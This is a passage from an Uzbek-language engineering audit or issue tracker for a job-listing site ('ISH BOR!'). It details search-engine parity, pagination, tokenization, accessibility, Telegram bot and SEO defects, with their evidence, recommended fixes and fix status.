- **Impact:** MEILI_HOST yoqilgan bo'lsa, foydalanuvchi faqat saralashni o'zgartirsa yoki 'tasdiqlangan' belgisini qo'ysa ham natijalar soni o'zgaradi. Facet sonlari ro'yxat jamisiga mos kelmaydi. Sahifada N ta natija ko'rsatgan saqlangan qidiruv alert yubormasligi mumkin. Eskirgan URL (masalan employment=yoq) bir drayverda barcha natijalarni, boshqasida 0 ni ko'rsatadi.
- **Evidence:** vacancies.service.ts:352-354 engine sharti; :430-447 computeFacets Mongo'da; alerts.service.ts:185-195 Mongo'da. search.service.ts:122-123 toDoc description slice(0,4000), requirements slice(0,2000); :240-252 `oneOf` va employment `IN [...]` allow-list'siz; :257-263 matchingStrategy berilmagan. vacancies.service.ts:118-122,202-203 EXPERIENCE_VALUES/EMPLOYMENT_VALUES bilan splitList. e2e-check.mjs:270 engine 'mongodb' deb tasdiqlanadi; :287 employment=yoq -> total 1 faqat Mongo'da tekshiriladi.
- **Recommended fix:** Bitta semantikani tanlang. A variant: Meili'da matchingStrategy 'all' qiling va typo tolerance'ni sozlang, to'liq matnni indekslang, companyId/isVerified/isPremium/publishedAt'ni filterable qiling, boshqa saralashlar, facetlar va alertlarni ham engine orqali o'tkazing. B variant: Meili faqat nomzod ID'larini bersin, barcha filtr va sonlar Mongo'da hisoblansin. Qaysi variant tanlansa ham, Meili filtrini qurishdan oldin EXPERIENCE_VALUES/EMPLOYMENT_VALUES allow-list'ini qo'llang. CI'da Meili instansiyasi bilan bir xil so'rovlar to'plamini ikkala drayverda solishtiradigan paritet testi qo'shing.
- **Severity izohi:** gap1-3 P2 saqlandi. gap1-10 (P3) ham drayverlar orasidagi filtr semantikasi farqi bo'lgani uchun shu yerga qo'shildi. ISSUE-061 faqat status qayta filtrini tuzatgan.
- **Manba topilmalar:** gap1-3, gap1-10
- **Bajarilgan fix:** gap1-3: PARTIAL — Differences are now documented in code at both call sites and two concrete divergences are gone (unknown enum values, estimated totals). Semantics were not unified: Meili still doe | gap1-10: FIXED — EngineQuery now takes arrays that listVacancies validated with splitList(..., EXPERIENCE_VALUES/EMPLOYMENT_VALUES), so an unknown experience/employment value is dropped on the Meil
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-192

**Meili yo'li taxminiy jami qaytaradi, 1000-natijadan keyingi sahifalar bo'sh keladi, tartibi esa Mongo 'relevance' bilan mos emas**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** search/pagination
- **Fayl:** `apps/api/src/modules/search/search.service.ts:266`
- **Root cause:** estimatedTotalHits hech qanday tuzatishsiz jami sifatida uzatiladi, aktiv bo'lmagan qatorlar olib tashlangandan keyin ham. updateSettings pagination.maxTotalHits'ni bermaydi, shuning uchun Meili sukuti 1000 amal qiladi (hujjatlardan xulosa). sort isPremium:desc ranking qoidalarida words/typo/proximity/attribute'dan keyin turadi va publishedAt bo'yicha tiebreak yo'q. Mongo 'relevance' esa matnni baholamaydi va isPremium -> publishedAt -> id tartibida saralaydi.
- **Impact:** Keng so'rovlarda sarlavhadagi natijalar soni taxminiy bo'ladi. 1000-natijadan keyingi sahifalar (20 tadan olganda 51-sahifadan boshlab) bo'sh keladi, pageCount esa ko'proq sahifa va'da qiladi. Sahifada pageSize'dan kam karta chiqishi mumkin. Premium vakansiyalar Mongo rejimida birinchi turadi, Meili rejimida esa yo'q. Mongo rejimida 'relevance' amalda sana tartibi: sarlavhasi mos kelgan vakansiya faqat tavsifi mos kelgan yangiroq vakansiyadan pastda turadi.
- **Evidence:** search.service.ts:257-266 `index.search(query.text, { filter, offset, limit, sort: ['isPremium:desc'] })`, `total: res.estimatedTotalHits ?? res.hits.length`; :62 `rankingRules: ['words','typo','proximity','attribute','sort','exactness']`, maxTotalHits yo'q. vacancies.service.ts:368-384 status qayta filtri jamini o'zgartirmaydi; :276-284 relevance uchun DATE_ORDER. Misol: ?text=menejer&page=60 -> offset 1180 > 1000 -> items [] (xulosa). e2e-check.mjs:294 faqat sonni tekshiradi.
- **Recommended fix:** pagination.maxTotalHits'ni API sahifa chegarasini qamraydigan qiymatgacha oshiring yoki Meili rejimida sahifalar sonini cheklang; aniq totalHits olish uchun page/hitsPerPage parametrlaridan foydalaning. 'sort' ranking qoidasining o'rnini ongli ravishda belgilang va publishedAt:desc tiebreak qo'shing. Mongo 'relevance' uchun sarlavha mosligini birinchi qo'ying (masalan ball hisoblaydigan aggregateRaw) yoki bu saralash nomini 'sana' deb o'zgartiring.
- **Severity izohi:** P2 saqlandi. 1000 chegarasi Meili sukutlaridan chiqarilgan xulosa, kodda tasdiqlanmagan.
- **Manba topilmalar:** gap1-4
- **Bajarilgan fix:** gap1-4: PARTIAL — total is now Meili's exact totalHits (page/hitsPerPage) instead of estimatedTotalHits; pagination.maxTotalHits is set to 10000 and any deeper page returns null from the engine so M
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-193

**Kompaniya nomi o'zgarganda vakansiyalar Meilisearch'da qayta indekslanmaydi: eski nom bo'yicha restartgacha topiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** search/index-sync
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:108`
- **Root cause:** Indeks hujjatlari companyName va companySlug'ning nusxasini saqlaydi. PUT /api/employer/company nomni yangilaydi va faqat bumpDataVersion() chaqiradi. Kompaniya vakansiyalarini qayta indekslaydigan kod yo'q: faqat startup'dagi warmSearchIndex yoki admin reindex bor. Sinxronlash fire-and-forget; removeVacancyFromIndex DB'ni qayta o'qimaydi, shuning uchun tez aktivlash-arxivlashda qo'shish o'chirishdan keyin bajarilib, arxivlangan hujjat indeksda qolib ketishi mumkin (xulosa).
- **Impact:** Meili yoqilganda yangi kompaniya nomi bo'yicha qidiruv uning vakansiyalarini topmaydi, eski nom esa keyingi deploygacha topib turadi. Karta DB'dan yangi nom bilan chiqqani uchun natija qidiruvga aloqasiz ko'rinadi. Mongo nomlarni jonli qidiradi, shuning uchun natija saralashga qarab farq qiladi.
- **Evidence:** companies.routes.ts:108-123 `prisma.company.update({ data: { name: body.name, ... } })`, keyin faqat `bumpDataVersion()`. search.service.ts:124-125 toDoc companyName/companySlug. Qayta indekslash faqat server.ts:282 warmSearchIndex va admin.routes.ts:528'da bor. vacancies.routes.ts:218,264,290 `void syncVacancyIndex(...)`. Misol: 'Orzubank' -> 'Orzu Bank'; ?text=Orzubank (relevance) vakansiyalarni hali topadi, sort=date to'g'ri ishlaydi (xulosa).
- **Recommended fix:** Nom yoki slug o'zgarganda kompaniyaning aktiv vakansiyalarini fonda, addDocuments bilan to'plab qayta indekslang. removeVacancyFromIndex vakansiya statusini qayta o'qisin yoki sinxronlashni vakansiya id'si bo'yicha ketma-ket bajaring. Blok/unblock va logo o'zgarishida ham shu yordamchidan foydalaning.
- **Severity izohi:** P2 saqlandi.
- **Manba topilmalar:** gap1-7
- **Bajarilgan fix:** gap1-7: PARTIAL — Fixed: after a rename, the company's active vacancies are re-indexed in the background (up to 500, sequential, only when Meilisearch is configured; a warning is logged above the ca
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-194

**So'rov tokenizatsiyasi modullar orasida umumiy emas: vakansiyada so'zlar jimgina tashlanadi va tinish belgisi so'zda qoladi, nomzod va admin qidiruvi butun satrni bitta substring sifatida qidiradi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** search/tokenization
- **Fayl:** `apps/api/src/modules/candidates/candidates.routes.ts:43`
- **Root cause:** Har bir modul so'rovni o'zicha bo'ladi. searchTerms faqat bo'shliq bo'yicha bo'ladi, 2 belgidan qisqa so'zlarni va 6-so'zdan keyingilarini jimgina tashlaydi, takrorlarni birlashtirmaydi va tinish belgisini so'z ichida qoldiradi. companies.list.ts'da minimal uzunlik yo'q. candidates.routes.ts va admin qidiruvlari matnni umuman bo'lmaydi va butun satrni har bir maydonda bitta substring sifatida qidiradi; admin pageSchema.text trim qilinmaydi.
- **Impact:** 'C' yoki 'R' so'rovi filtrlanmagan butun ro'yxatni natija sifatida ko'rsatadi. 'dasturchi, react' vergul tufayli mos kelmaydi. Uzun so'rovlarda eng aniq oxirgi so'zlar tushib qoladi. Ish beruvchi 'Aziz Karimov' yoki 'React TypeScript' deb qidirsa, nomzodlar ro'yxati bo'sh chiqadi. Admin foydalanuvchini to'liq ismi yoki oxirida bo'shliq qolgan email bo'yicha topa olmaydi.
- **Evidence:** vacancies.service.ts:137-143 bo'shliq bo'yicha split, length>=2, slice(0,6). companies.list.ts:247 `split + filter(Boolean) + slice(0,6)`, minimal uzunlik yo'q. candidates.routes.ts:43-61 `q = query.text ?? ''`, keyin `firstName: like(q)`, `lastName: like(q)`, `skillName: like(q)`, bo'linmagan. admin.routes.ts:142-149, 241-243, 336 xuddi shunday; :28 pageSchema.text trim'siz. vacancies.routes.ts:29,33 text faqat 200 belgigacha kesiladi. e2e-check.mjs:565 faqat 'aziz' ni sinaydi.
- **Recommended fix:** common/ ichida normalizeSearch ustiga qurilgan bitta tokenize(query) funksiyasini yarating. U har bir so'zning chetidagi tinish belgilarini olib tashlasin (C++, C#, node.js saqlansin), takrorlarni birlashtirsin va foydali so'z qolmasa matn filtrini qo'llamasin. 1 belgili so'zlarni butun so'z sifatida qidiring yoki aniq rad eting; 6 so'z chegarasini olib tashlang yoki foydalanuvchiga ko'rsating. Nomzod va admin qidiruvlarini vakansiya textFilter'idagi 'har bir so'z qaysidir maydonda bo'lsin' (AND of OR) mantiqqa o'tkazing. listQuerySchema.text va admin pageSchema.text'ga .trim().max(100) qo'shing.
- **Severity izohi:** Ikkala manba P2; ildizi bir xil (umumiy tokenizator yo'q) bo'lgani uchun birlashtirildi. ISSUE-044 faqat uzunlik chegaralari haqida.
- **Manba topilmalar:** gap1-6, gap1-9
- **Bajarilgan fix:** gap1-6: FIXED — tokenize(): edge punctuation stripped ("dasturchi," now matches), inner punctuation kept (C++, C#, node.js), duplicates dropped, max raised from 6 to 8 tokens, a punctuation-only q | gap1-9: PARTIAL — Nomzodlar qidiruvi tokenlarga bo'lindi (har so'z biror maydonda bo'lishi shart; Prisma contains MongoDB regexini o'zi ekranlaydi). Admin qidiruvi (apps/api/src/modules/admin/admin.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-195

**4 belgidan qisqa so'zlar sarlavha va kompaniya/kategoriya nomida substring sifatida mos keladi (keraksiz natija), talablarda esa umuman qidirilmaydi (tushib qolgan natija)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** search/relevance
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:267`
- **Root cause:** D-033 qisqa so'zlarni faqat tavsif va talablardan chiqarib tashlagan, sarlavha, kompaniya nomi va kategoriya nomida esa ular hali ham chegarasiz substring sifatida qidiriladi. Izohdagi 'sHaHRi' misoli faqat tavsifdan chetlatilgan. PHP, SQL, 1C, Go kabi ko'nikma so'zlari odatda faqat talablarda uchraydi, qisqa so'zlar esa u yerda qidirilmaydi.
- **Impact:** Mahsulotning o'zidagi mashhur 'HR' chip'i va 'IT', 'QA' so'rovlari aloqasiz vakansiyalarni qaytaradi va tegishlilarini o'tkazib yuboradi. Kompaniya nomidagi substring shu kompaniyaning barcha vakansiyalarini natijaga tortib keladi. Meili butun so'z bo'yicha qidiradi, shuning uchun ikki drayver turli to'plam qaytaradi.
- **Evidence:** vacancies.service.ts:266-269 `term.length < 4 ? [{ title: like(term) }, ...byRelation] : [title, description, requirements, ...byRelation]`; :183-184 `company.findMany({ where: { name: like(term) } })`. Demo: ?text=IT -> 'Kredit mutaxassisi' (demo-seed.ts:563, kred-IT) va 'IT stajyor' (:491). ?text=PHP talablarida PHP bo'lgan 'Backend dasturchi'ni topmaydi (kod asosida xulosa). web lib/salaries/query.ts:107 'HR' chip'i. DECISIONS.md:359 (D-033).
- **Recommended fix:** Qisqa so'zlarni so'z chegarasi bilan, talablarni ham qo'shgan holda qidiring: escape qilingan (^|[^\p{L}\p{N}])term($|[^\p{L}\p{N}]) regex. Kompaniya va kategoriya nomini ID'ga aylantirishda ham shu qoidani qo'llang. D-033'ni yangilang va 'HR', 'IT', 'PHP' uchun e2e holatlarini qo'shing.
- **Severity izohi:** P2 saqlandi. D-033 tracker muammosi emas, qaror.
- **Manba topilmalar:** gap1-2
- **Bajarilgan fix:** gap1-2: PARTIAL — Tokenisation and false-hit sources from punctuation/duplicates are fixed, and the short-term rule is now documented in code. Word-boundary matching (including requirements) was NOT
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-196

**Telefon gate eslatmasi ekran o'quvchiga e'lon qilinmaydi: Ariza/Joylash/Xabar bloklansa, hech qanday xabar eshitilmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** a11y/status-messages
- **Fayl:** `apps/web/src/components/PhoneGateNotice.tsx:9`
- **Root cause:** PhoneGateNotice oddiy div chizadi: role=alert/status, aria-live va fokus nishoni yo'q. Chaqiruvchilar uni API PHONE_NOT_VERIFIED qaytargandan keyingina mount qiladi, fokus esa amalni boshlagan tugmada qoladi. Ekran o'quvchi faqat tugmaning band holati tugaganini sezadi.
- **Impact:** Asosiy oqimlarda uz/ru/en tillarida WCAG 4.1.3 (AA) buziladi: nomzodning ariza berishi, ish beruvchining e'lon joylashi yoki qoralama saqlashi, ariza bo'yicha xabar/holat amallari, vakansiyalar ro'yxatidagi amallar, nomzod qidiruvidan chat ochish, kompaniya sharhi. Ekran o'quvchi foydalanuvchisi nima uchun hech narsa bo'lmaganini va Telegram orqali telefonni tasdiqlash kerakligini bilmaydi.
- **Evidence:** PhoneGateNotice.tsx:9 `<div className='animate-slide-down rounded-xl ...'>`, role va aria-live yo'q. Mount qilingan joylar: ApplyCard.tsx:142 (pastdagi :144 `<p role='alert'>` e'lon qilinadi), FormSidebar.tsx:234 (VacancyForm.tsx:224 `if (isPhoneGateError(err)) return setGated(true)`), ApplicationSidebar.tsx:115, EmployerVacanciesView.tsx:180, pages/employer/candidates/+Page.tsx:138, CompanyActions.tsx:81, CompanyReviews.tsx:240. Hech biri live region ichida emas.
- **Recommended fix:** PhoneGateNotice ildiziga role='alert' qo'ying (u faqat amal muvaffaqiyatsiz bo'lgandan keyin mount bo'ladi) yoki uni doim mavjud bo'lgan live region ichida chizing. Xohishga ko'ra tabIndex=-1 berib, gate holatida fokusni unga o'tkazing (NotificationsView'dagi kabi). 7 ta chaqiruv joyining hammasida xabar ikki marta e'lon qilinmasligini tekshiring.
- **Severity izohi:** P2 saqlandi.
- **Manba topilmalar:** gap5-1
- **Bajarilgan fix:** gap5-1: FIXED — PhoneGateNotice root now has role="alert", tabIndex={-1} and takes focus on mount, so a blocked Apply/Publish/Message is announced and reachable. All seven call sites mount it only
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-197

**Profil/rezyume va kompaniya formalarida majburiy maydonlar belgilanmaydi, validatsiya xatolari va saqlash natijasi e'lon qilinmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** a11y/forms
- **Fayl:** `apps/web/src/components/profile/ui.tsx:101`
- **Root cause:** Vakansiya formasidagi to'g'ri ishlaydigan FormControls primitivlari boshqa formalarda qayta ishlatilmagan. Profil Field majburiy maydonni faqat aria-hidden '*' bilan belgilaydi, required/aria-required uzatmaydi, xatoni rolsiz <p> ichida chizadi, xato hint o'rnini egallaganda ham hintId'ga ishora qiladi. Eski EmployerCompanyForm label'larni o'zi yozadi: majburiy belgi yo'q, Save tushuntirishsiz disabled bo'ladi, xato va 'saqlandi' matni live rolisiz, fallback matnlar o'zbekcha hardcode qilingan.
- **Impact:** /profile sahifasida (rezyume wizard, tajriba, ta'lim, shaxsiy ma'lumotlar) va ish beruvchining kompaniya sozlamasida (vakansiya joylashdan oldin kerak) uz/ru/en tillarida WCAG 1.3.1, 3.3.1, 3.3.2 (A), 4.1.3 va 3.1.2 (AA) buziladi. Ekran o'quvchi foydalanuvchisi bo'sh majburiy maydon bilan Keyingi yoki Saqlash bosganda hech narsa eshitmaydi. Kompaniya formasi xatosi pastda, e'lonsiz chiqadi, 'saqlandi' esa 2.5 soniyada jimgina yo'qoladi. /ru va /en sahifalarida 'Xatolik yuz berdi' chiqadi.
- **Evidence:** profile/ui.tsx:100-104 `<span className='text-danger' aria-hidden>*</span>`, sr-only matn yo'q; :107-110 xato <p> rolsiz; :95 describedBy doim hintId'ni o'z ichiga oladi. ProfessionalInfo.tsx:45-47, ExperienceList.tsx:243-260, EducationList.tsx:209-229, PersonalInfo.tsx:76-78: xato o'rnatiladi va funksiya qaytadi, fokus ko'chmaydi. EmployerCompanyForm.tsx:167-168 nom maydonida marker yo'q; :208 `disabled={saving || !name.trim()}`; :213 rolsiz 'saqlandi'; :220 `{error && <p className='mt-3 text-sm text-signal'>`; :48,61,95 'Xatolik yuz berdi'. Namuna: FormControls.tsx:40-46.
- **Recommended fix:** profile/ui.tsx Field'ga sr-only '(majburiy)' matnini qo'shing va required'ni ichki elementlarga aria-required sifatida uzating. aria-describedby'ni faqat haqiqatda chizilgan elementlardan tuzing. Submit muvaffaqiyatsiz bo'lsa, xatolarni role=alert bilan chizing yoki birinchi noto'g'ri maydonga fokus o'tkazing. EmployerCompanyForm'ni FormControls Field/TextInput ustiga qayta quring: majburiy belgi qo'ying; Save doim yoqilgan bo'lsin va submit'da maydon xatosi ko'rsatilib, fokus o'sha maydonga o'tsin; xato tegishli maydon yonida, danger rangida, role=alert bilan chiqsin; 'saqlandi'ga role=status bering; hardcode matnlar o'rniga t.* kalitlarini ishlating; logo preview'ga ma'noli alt bering. saveMyCompany payload'ini o'zgartirmang.
- **Severity izohi:** Ikkala manba P2; ildizi bir xil (umumiy accessible form primitivlari ishlatilmagan).
- **Manba topilmalar:** gap5-2, gap5-5
- **Bajarilgan fix:** gap5-2: FIXED — profile/ui.tsx Field now exposes required (sr-only text + aria-required through the render prop), announces errors with role=alert, and builds aria-describedby only from the elemen | gap5-5: FIXED — Employer company form: required name marked visually and for screen readers (asterisk + sr-only text + aria-required), Save is always enabled and an empty name produces a role=aler
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-198

**Remount va unmount'da klaviatura fokusi <body>'ga tushib qoladi: rezyume wizard, inline editorlar va ish beruvchining arizalar sahifasi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** a11y/focus-management
- **Fayl:** `apps/web/src/components/employer/applications/EmployerApplicationsView.tsx:214`
- **Root cause:** Komponentlar key orqali qayta mount qilinadi yoki fokuslangan elementni DOM'dan olib tashlaydi, lekin fokusni qaytarish naqshi yo'q (u faqat MessagesView'da bor). ResumeWizard qadam kontentini `<div key={key}>` ichida chizadi, shuning uchun goStep fokuslangan Orqaga/Keyingi tugmalarini yo'q qiladi; inline editorlar, skill chip'lari va fayl kartasi ham xuddi shunday. ApplicationSidebar `${id}-${status}` bilan key'langan: holat yangilanganda tugma yo'qoladi va useDialog DOM'dan uzilgan trigger'ga focus() chaqiradi. Mobilda ariza tanlash va Orqaga tugmasi fokusni ko'chirmaydi.
- **Impact:** uz/ru/en tillarida WCAG 2.4.3 (A) va 1.3.1 (A) buziladi. Rezyume wizard'da har Keyingi'dan keyin klaviatura va ekran o'quvchi foydalanuvchisi hujjat boshidan boshlaydi va qaysi qadam yuklanganini bilmaydi; stepper tugagan qadamlarni faqat vizual ko'rsatadi. /employer/applications'da ko'p arizani ko'rib chiqayotgan ish beruvchi har Taklif/Qabul/Rad etish/Yangilash amalidan keyin joyini yo'qotadi.
- **Evidence:** ResumeWizard.tsx:137 `<div key={key} className='animate-fade-in ...'>` StepFooter tugmalarini o'raydi; :69 h1'da ref/tabIndex yo'q; :112-122 stepper'da IconCheck aria-hidden, sr-only matn yo'q. ExperienceList.tsx:88,90,116; EducationList.tsx:70,96,157; SkillsEditor.tsx:167; ResumeFile.tsx:100. EmployerApplicationsView.tsx:214 key `${selected.id}-${selected.status}`; lib/useDialog.ts:59 `trigger?.focus?.()` olib tashlangan tugunda chaqiriladi; :139-148 mobil tanlash faqat scroll qiladi; ApplicationDetail.tsx:177-185 Orqaga. Namuna: MessagesView.tsx:82-116.
- **Recommended fix:** Wizard yoki qadam sarlavhasiga tabIndex=-1 bering va qadam o'zgarganda (birinchi render'da emas) fokusni unga o'tkazing. 'N-qadam, jami 6' uchun polite live region va stepper'ga sr-only 'bajarildi' matnini qo'shing. Editor yopilgach yoki element o'chirilgach fokusni trigger'ga yoki yangi kartaga, chip olib tashlangach input'ga, fayl yuklash/o'chirishdan keyin yangi boshqaruv elementiga qaytaring. ApplicationSidebar'ni faqat id bilan key'lang va status o'zgarganda next/reason holatini effekt ichida tiklang. Mobilda ariza tanlanganda detail h2'ga, Orqaga bosilganda [data-application-row=id]'ga fokus bering (MessagesView naqshi).
- **Severity izohi:** Ikkala manba P2; bir xil fokusni qaytarish naqshi yo'qligi sababli birlashtirildi.
- **Manba topilmalar:** gap5-3, gap5-4
- **Bajarilgan fix:** gap5-3: PARTIAL — Done: the wizard h1 is focused on each step change (not on the first render) and the step counter is a polite live region; the stepper keeps the number and adds sr-only 'completed' | gap5-4: FIXED — Sidebar faqat ID bo'yicha kalitlanadi va holat o'zgarganda effekt bilan tozalanadi; holat o'zgargach fokus holat kartasi sarlavhasiga, telefonda tanlaganda tafsilot sarlavhasiga (t
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-199

**Botdagi oddiy /start ISH BOR! saytiga havola yubormaydi (C qoidasi)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** telegram/bot
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:252`
- **Root cause:** Xush kelibsiz matni bog'lash va support holati uchun yozilgan; /start xatti-harakati hech bir hujjatda belgilanmagan. WEB_ORIGIN mavjud bo'lsa ham javobga qo'shilmagan.
- **Impact:** Botni to'g'ridan-to'g'ri ochgan foydalanuvchi ko'rsatma oladi, lekin saytga havola olmaydi; C qoidasidagi ommaviy foydali funksiya bajarilmaydi. Ta'siri kichik.
- **Evidence:** telegram.service.ts:252-259 `if (!payload) { await sendTelegramMessage(chatId, '👋 <b>ISH BOR!</b> botiga xush kelibsiz ... profil sahifasidan «Telegram orqali tasdiqlash» ... support jamoasi javob beradi') }`, URL yo'q. Noto'g'ri payload uchun :263-265 umumiy 'Havola eskirgan' javobi (D qoidasiga mos). .env.example:30 WEB_ORIGIN. README, DEPLOY va tizim 11-bo'limida bot buyruqlari tavsiflanmagan.
- **Recommended fix:** Oddiy /start javobiga WEB_ORIGIN havolasini yoki 'Saytni ochish' inline URL tugmasini qo'shing. Bot buyruqlari va payload qoidalarini (bir martalik, qisqa muddatli, shaxsiy ma'lumotsiz, noto'g'ri payload'ga umumiy javob) ARCHITECTURE_AUDIT yoki README'da hujjatlashtiring.
- **Severity izohi:** Formal jihatdan C qoidasi buzilgan, lekin xavfsizlik yoki ma'lumotga ta'siri yo'q va tuzatish bir qatorlik; shuning uchun P1 emas, P2.
- **Manba topilmalar:** docs-11
- **Bajarilgan fix:** docs-11: FIXED — Plain /start now sends ${WEB_ORIGIN}/login as text plus an inline URL button (https only) and explains that Telegram is used for phone verification and password recovery.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-200

**Vakansiya va kompaniya detail sahifalari ro'yxat +Head'ini meros oladi: ikkitadan description, og:title, og:type va canonical chiqadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** seo/meta
- **Fayl:** `apps/web/src/pages/vacancies/+Head.tsx:31`
- **Root cause:** Vike merosi: pages/vacancies/+Head.tsx va companies/+Head.tsx /vacancies/@slug va /companies/@slug'ga ham qo'llanadi, vike-react Head'lari esa yig'iladi. Maqolalar articles/index/ ga ko'chirilib tuzatilgan, vacancies, companies va employer ko'chirilmagan.
- **Impact:** Eng qimmatli indekslanadigan sahifalarda ikkinchi umumiy description, ikki og:title, og:type article+website va takroriy canonical chiqadi. Snippet va ulashish ko'rinishi crawler'ga bog'liq bo'lib qoladi. employer/+Head.tsx shaxsiy employer/* sahifalariga ham landing meta beradi.
- **Evidence:** dist/server/entries/src_pages_vacancies_-slug.mjs:2285-2293 Head manbalari: vacancies/@slug/+Head.tsx, vacancies/+Head.tsx, HeadDefault.tsx; companies/+Head.tsx va employer/+Head.tsx ildiz papkada Seo canonical bilan; articles/index/+data.ts izohi aynan shu merosni tushuntiradi.
- **Recommended fix:** vacancies/{+Page,+Head,+data,+title} ni pages/vacancies/index/ ga, companies/* ni companies/index/ ga, employer landing va +Head'ni employer/index/ ga ko'chiring. Build'dan keyin har entry'da faqat bitta sahifa Head va HeadDefault qolganini tekshiring.
- **Severity izohi:** P2 saqlandi. Build natijasi bilan tasdiqlandi; marshrutlar o'zgarmaydi.
- **Manba topilmalar:** seo-1
- **Bajarilgan fix:** seo-1: FIXED — vacancies/+Head.tsx and companies/+Head.tsx now return null when routeParams.slug is set, so the detail pages emit exactly one page Head + HeadDefault. I did NOT move the pages int
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-201

**OG rasm shriftlari faqat lotin: kirillcha vakansiya sarlavhasi va kompaniya nomi glifsiz chiziladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** seo/og
- **Fayl:** `apps/api/src/modules/og/og.service.ts:33`
- **Root cause:** Satori'ga faqat space-grotesk-latin-700 va inter-latin-400/600 beriladi, loadAdditionalAsset fallback'i yo'q. Space Grotesk'da kirill to'plami umuman yo'q.
- **Impact:** O'zbekistonda ruscha vakansiyalar ko'p. Ular Telegram va sotsial tarmoqlarda ulashilganda sarlavha va kompaniya satri bo'sh yoki 'tofu' bo'ladi, bosishlar kamayadi. Glif yo'qligidagi aniq render satori xatti-harakati bo'yicha taxmin.
- **Evidence:** og.service.ts:33 `space-grotesk-latin-700-normal.woff`, :34-35 `inter-latin-400-normal.woff`, `inter-latin-600-normal.woff`; @fontsource/space-grotesk/files'da cyrillic fayllari 0 ta; @fontsource/inter'da inter-cyrillic-400/600 bor (xom topilma).
- **Recommended fix:** inter-cyrillic 400/600 (va latin-ext) fayllarini qo'shimcha 'Inter' shrift sifatida ro'yxatdan o'tkazing. Sarlavhada kirill bo'lsa Inter bold ishlating yoki fontFamily'da fallback bering. Kirillcha sarlavha bilan render testi qo'shing.
- **Severity izohi:** P2 saqlandi. Joriy kodda qatorlar 33-35 (xom topilmada 78-80 ko'rsatilgan).
- **Manba topilmalar:** seo-7
- **Bajarilgan fix:** seo-7: FIXED — Inter Cyrillic 400/600/700 are registered as their own satori family (fallback only works across family names), with the stacks "Inter, Inter Cyrillic" and "Space Grotesk, Inter Cy
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-202

**Tarjima qilinmagan vakansiya, kompaniya va maqola kontenti ru/en hreflang alternate sifatida e'lon qilinadi; Article inLanguage URL tilidan olinadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Area:** seo/hreflang
- **Fayl:** `apps/api/src/modules/seo/seo.routes.ts:150`
- **Root cause:** Har ochiq URL /, /ru va /en ostida sitemap va HeadDefault'da alternate sifatida chiqadi, lekin faqat UI shabloni tarjima qilingan. Ish beruvchi matni va maqolalar bitta tilda; Article'da til maydoni yo'q.
- **Impact:** O'n minglab vakansiyaning uchta deyarli bir xil nusxasi paydo bo'ladi, crawl budjeti va sitemap hajmi uch baravar o'sadi. /ru/articles/x o'zbekcha matnga inLanguage 'ru' beradi. Og'irlik bahosi qisman Google ko'p tilli qo'llanmasidan xulosa.
- **Evidence:** seo.routes.ts:150-157 buildUrlSet har yo'lga 3 til + x-default; HeadDefault.tsx:52-55 har sahifada alternates; schema.prisma Article (649-) locale maydonisiz; articles/@slug/+Head.tsx:43 `inLanguage: locale`.
- **Recommended fix:** Kontent tilini saqlang: Article.locale, vakansiya uchun ixtiyoriy aniqlangan til. Detail sahifalarda hreflang va sitemap alternates'ni faqat asosiy til uchun chiqaring yoki /ru va /en detail canonical'ini kontent tilidagi URL'ga qarating. Article inLanguage saqlangan maydondan olinsin. Haqiqatan tarjima qilingan statik va hub sahifalarda alternates qolsin.
- **Severity izohi:** P2, ishonch o'rtacha. Canonical o'zgarishi indekslangan URL'larni siljitadi, monitoring bilan chiqaring.
- **Manba topilmalar:** seo-8
